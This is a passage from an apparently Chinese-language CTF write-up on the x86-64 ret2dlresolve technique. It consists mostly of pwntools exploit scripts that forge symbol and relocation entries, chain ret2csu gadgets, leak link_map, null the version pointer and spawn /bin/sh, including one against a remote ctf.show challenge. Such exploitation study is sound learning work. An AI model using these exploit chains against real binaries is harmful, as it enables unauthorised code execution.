class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">    syment = elf.dynamic_value_by_tag(<span class="string">&quot;DT_SYMENT&quot;</span>) <span class="comment"># symbol entry size</span></span><br><span class="line"></span><br><span class="line">    dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake function string</span></span><br><span class="line">    func_string_addr = store_addr</span><br><span class="line">    resolve_data = func_name + <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake symbol</span></span><br><span class="line">    symbol_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = symbol_addr - dynsym</span><br><span class="line">    pad = syment - offset % syment <span class="comment"># align syment size</span></span><br><span class="line">    symbol_addr = symbol_addr+pad</span><br><span class="line">    symbol = p32(func_string_addr-dynstr)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    symbol_index = (symbol_addr - dynsym)/<span class="number">24</span></span><br><span class="line">    resolve_data +=<span class="string">&#x27;a&#x27;</span>*pad</span><br><span class="line">    resolve_data += symbol</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake reloc </span></span><br><span class="line">    reloc_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = reloc_addr - rel_plt</span><br><span class="line">    pad = relaent - offset % relaent <span class="comment"># align relaent size</span></span><br><span class="line">    reloc_addr +=pad</span><br><span class="line">    reloc_index = (reloc_addr-rel_plt)/<span class="number">24</span></span><br><span class="line">    rinfo = (symbol_index&lt;&lt;<span class="number">32</span>) | <span class="number">7</span></span><br><span class="line">    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(<span class="number">0</span>)</span><br><span class="line">    resolve_data +=<span class="string">&#x27;a&#x27;</span>*pad</span><br><span class="line">    resolve_data +=write_reloc</span><br><span class="line"></span><br><span class="line">    resolve_call = p64(plt0) + p64(reloc_index)</span><br><span class="line">    <span class="keyword">return</span> resolve_data, resolve_call</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">store_addr = bss_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, <span class="string">&quot;system&quot;</span>,elf.got[<span class="string">&quot;write&quot;</span>])</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,store_addr,<span class="built_in">len</span>(resolve_data)))  </span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line"><span class="comment"># send resolve data</span></span><br><span class="line">io.send(resolve_data)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sh = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">bin_sh_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bin_sh_addr,<span class="built_in">len</span>(sh)))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">0x00000000004007a3</span>) <span class="comment"># 0x00000000004007a3: pop rdi; ret; </span></span><br><span class="line">rop.raw(bin_sh_addr)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>然而， 简单地运行后发现，程序崩溃了。</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-04_22-10-47.png" alt="1"></p>
<p>通过调试，我们发现，程序是在获取对应的版本号</p>
<ul>
<li>rax 为 0x4003f6，指向版本号数组</li>
<li>rdx 为 0x155f1，符号表索引，同时为版本号索引</li>
</ul>
<p>同时 rax + rdx*2 为 0x42afd8，而这个地址并不在映射的内存中。</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-04_22-11-25.png" alt="1"></p>
<p>那我们能不能想办法让它位于映射的内存中呢。估计有点难</p>
<ul>
<li>bss 的起始地址为 0x601050，那么索引值最小为 (0x601050-0x400398)&#x2F;24&#x3D;87517，即 0x4003f6 + 87517*2 &#x3D; 0x42afb0</li>
<li>bss 可以最大使用的地址为 0x601fff，对应的索引值为 (0x601fff-0x400398)&#x2F;24&#x3D;87684，即 0x4003f6 + 87684*2 &#x3D; 0x42b0fe</li>
</ul>
<p>显然都在非映射的内存区域。因此，我们得考虑考虑其它办法。通过阅读 dl_fixup 的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取符号的版本信息</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX(DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现，如果把 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL，那程序就不会执行下面的代码，版本号就为 NULL，就可以正常执行代码。但是，这样的话，我们就需要知道 link_map 的地址了。 GOT 表的第 0 项（本例中 0x601008）存储的就是 link_map 的地址。</p>
<p>因此，我们可以</p>
<ul>
<li>泄露该处的地址</li>
<li>将 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL</li>
<li>最后执行利用脚本即可</li>
</ul>
<p>通过汇编代码，我们可以看出 l-&gt;l_info[VERSYMIDX(DT_VERSYM)] 的偏移为 0x1c8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x7fa4b09f7ea1 &lt;_dl_fixup+97&gt;     mov    rax, qword ptr [r10 + 0x1c8]</span><br><span class="line">  0x7fa4b09f7ea8 &lt;_dl_fixup+104&gt;    xor    r8d, r8d</span><br><span class="line">  0x7fa4b09f7eab &lt;_dl_fixup+107&gt;    test   rax, rax</span><br><span class="line">  0x7fa4b09f7eae &lt;_dl_fixup+110&gt;    je     _dl_fixup+156 &lt;_dl_fixup+156&gt;</span><br></pre></td></tr></table></figure>

<p>因此，我们可以简单修改下 exp。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x40079A</span></span><br><span class="line">vuln_addr = <span class="number">0x400637</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve_x64</span>(<span class="params">elf, store_addr, func_name, resolve_addr</span>):</span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">    relaent = elf.dynamic_value_by_tag(<span class="string">&quot;DT_RELAENT&quot;</span>) <span class="comment"># reloc entry size</span></span><br><span class="line"></span><br><span class="line">    dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">    syment = elf.dynamic_value_by_tag(<span class="string">&quot;DT_SYMENT&quot;</span>) <span class="comment"># symbol entry size</span></span><br><span class="line"></span><br><span class="line">    dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake function string</span></span><br><span class="line">    func_string_addr = store_addr</span><br><span class="line">    resolve_data = func_name + <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake symbol</span></span><br><span class="line">    symbol_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = symbol_addr - dynsym</span><br><span class="line">    pad = syment - offset % syment <span class="comment"># align syment size</span></span><br><span class="line">    symbol_addr = symbol_addr+pad</span><br><span class="line">    symbol = p32(func_string_addr-dynstr)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    symbol_index = (symbol_addr - dynsym)/<span class="number">24</span></span><br><span class="line">    resolve_data +=<span class="string">&#x27;a&#x27;</span>*pad</span><br><span class="line">    resolve_data += symbol</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct fake reloc </span></span><br><span class="line">    reloc_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = reloc_addr - rel_plt</span><br><span class="line">    pad = relaent - offset % relaent <span class="comment"># align relaent size</span></span><br><span class="line">    reloc_addr +=pad</span><br><span class="line">    reloc_index = (reloc_addr-rel_plt)/<span class="number">24</span></span><br><span class="line">    rinfo = (symbol_index&lt;&lt;<span class="number">32</span>) | <span class="number">7</span></span><br><span class="line">    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(<span class="number">0</span>)</span><br><span class="line">    resolve_data +=<span class="string">&#x27;a&#x27;</span>*pad</span><br><span class="line">    resolve_data +=write_reloc</span><br><span class="line"></span><br><span class="line">    resolve_call = p64(plt0) + p64(reloc_index)</span><br><span class="line">    <span class="keyword">return</span> resolve_data, resolve_call</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">store_addr = bss_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, <span class="string">&quot;system&quot;</span>,elf.got[<span class="string">&quot;write&quot;</span>])</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,store_addr,<span class="built_in">len</span>(resolve_data)))  </span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">io.send(rop.chain())</span><br><span class="line"><span class="comment"># send resolve data</span></span><br><span class="line">io.send(resolve_data)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sh = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">bin_sh_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bin_sh_addr,<span class="built_in">len</span>(sh)))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak link_map addr</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;write&#x27;</span>],<span class="number">1</span>,<span class="number">0x601008</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">link_map_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(link_map_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span> ,elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,link_map_addr+<span class="number">0x1c8</span>,<span class="number">8</span>))</span><br><span class="line">rop.raw(vuln_addr)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./main_partial_relro_64&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">0x00000000004007a3</span>) <span class="comment"># 0x00000000004007a3: pop rdi; ret; </span></span><br><span class="line">rop.raw(bin_sh_addr)</span><br><span class="line">rop.raw(resolve_call)</span><br><span class="line"><span class="comment"># rop.raw(&#x27;a&#x27;*(256-len(rop.chain())))</span></span><br><span class="line">io.send(rop.chain())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>然而，还是崩溃。但这次比较好的是，确实已经执行到了 system 函数。通过调试，我们可以发现，system 函数在进一步调用 execve 时出现了问题</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-06-04_22-13-10.png" alt="1"></p>
<p>即环境变量的地址指向了一个莫名的地址，这应该是我们在进行 ROP 的时候破坏了栈上的数据。那我们可以调整调整，使其为 NULL 或者尽可能不破坏原有的数据。这里我们选择使其为 NULL。</p>
<p>首先，我们可以把读伪造的数据和 &#x2F;bin&#x2F;sh 部分的 rop 合并起来，以减少 ROP 的次数</p>
<p>这时候 envp 被污染的数据就只有 0x61 了，即我们填充的数据’a’。那就好办了，我们只需要把所有的 pad 都替换为 <code>\x00</code> 即可。</p>
</blockquote>
<p>最终完整的exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28162</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">csu_front_addr = <span class="number">0x400780</span></span><br><span class="line">csu_end_addr = <span class="number">0x40079A</span></span><br><span class="line">show = <span class="number">0x400637</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4007a3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx =r15</span></span><br><span class="line">    payload=p64(csu_end_addr)</span><br><span class="line">    payload+=p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload+=p64(csu_front_addr)</span><br><span class="line">    payload+=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve_x64</span>(<span class="params">elf,store_addr,func_name,resolve_addr</span>):</span><br><span class="line">    plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">    </span><br><span class="line">    rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">    </span><br><span class="line">    relaent = elf.dynamic_value_by_tag(<span class="string">&quot;DT_RELAENT&quot;</span>) <span class="comment">#重定位表大小</span></span><br><span class="line">    </span><br><span class="line">    dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">    syment = elf.dynamic_value_by_tag(<span class="string">&quot;DT_SYMENT&quot;</span>) <span class="comment">#符号表大小</span></span><br><span class="line">    </span><br><span class="line">    dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创造fake函数字符</span></span><br><span class="line">    func_string_addr = store_addr</span><br><span class="line">    resolve_data = func_name + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创造fake symbol</span></span><br><span class="line">    symbol_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = symbol_addr - dynsym</span><br><span class="line">    pad = syment - offset % syment <span class="comment"># align syment size</span></span><br><span class="line">    symbol_addr = symbol_addr+pad</span><br><span class="line">    symbol = p32(func_string_addr-dynstr)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    symbol_index = (symbol_addr - dynsym)//<span class="number">24</span></span><br><span class="line">    resolve_data += <span class="string">b&#x27;\x00&#x27;</span>*pad</span><br><span class="line">    resolve_data += symbol</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#创造fake reloc</span></span><br><span class="line">    reloc_addr = store_addr+<span class="built_in">len</span>(resolve_data)</span><br><span class="line">    offset = reloc_addr - rel_plt</span><br><span class="line">    pad = relaent - offset%relaent <span class="comment"># align relaent size</span></span><br><span class="line">    reloc_addr +=pad</span><br><span class="line">    reloc_index = (reloc_addr-rel_plt)//<span class="number">24</span></span><br><span class="line">    rinfo = (symbol_index&lt;&lt;<span class="number">32</span>) | <span class="number">7</span></span><br><span class="line">    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(<span class="number">0</span>)</span><br><span class="line">    resolve_data += <span class="string">b&#x27;\x00&#x27;</span>*pad</span><br><span class="line">    resolve_data +=write_reloc</span><br><span class="line">    </span><br><span class="line">    resolve_call = p64(plt0) + p64(reloc_index)</span><br><span class="line">    <span class="keyword">return</span> resolve_data,resolve_call</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Welcome to CTFshowPWN!\n&quot;</span>)</span><br><span class="line">store_addr = bss_addr + <span class="number">0x100</span></span><br><span class="line">sh = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创造fake string,symbol,修改.dynamic部分中的.dynstr指针到特定位置。</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">offset = <span class="number">112</span>+<span class="number">8</span></span><br><span class="line">rop.raw(<span class="string">b&#x27;\x00&#x27;</span>*offset)</span><br><span class="line">resolve_data,resolve_call = ret2dlresolve_x64(elf,store_addr,<span class="string">b&quot;system&quot;</span>,elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span 